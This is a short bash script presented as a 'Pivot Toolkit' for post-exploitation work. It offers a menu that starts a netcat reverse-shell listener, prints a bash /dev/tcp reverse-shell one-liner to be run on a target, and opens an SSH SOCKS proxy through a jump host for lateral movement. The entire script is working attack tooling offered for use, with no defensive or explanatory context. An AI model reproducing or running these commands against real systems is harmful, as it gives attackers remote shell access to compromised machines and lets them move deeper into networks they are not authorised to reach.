#!/bin/bash

echo "=== Pivot Toolkit ==="
echo "1) Start reverse shell listener"
echo "2) Generate reverse shell command"
echo "3) Create SOCKS proxy tunnel (ssh)"
echo "4) Exit"
echo ""

read -p "Select option: " opt

case $opt in
  1)
    read -p "Local port to listen on: " LPORT
    echo "[+] Listening on port $LPORT..."
    nc -lvnp "$LPORT"
    ;;
  2)
    read -p "Your IP (listener): " LHOST
    read -p "Your Port: " LPORT
    echo "[*] Use this on target:"
    echo ""
    echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    ;;
  3)
    read -p "SSH user@jump_host: " JUMP
    read -p "Local SOCKS port (e.g., 1080): " SPORT
    echo "[+] Starting proxy via $JUMP"
    ssh -D "$SPORT" -q -C -N "$JUMP"
    ;;
  4)
    exit 0
    ;;
  *)
    echo "Invalid option."
    ;;
esac

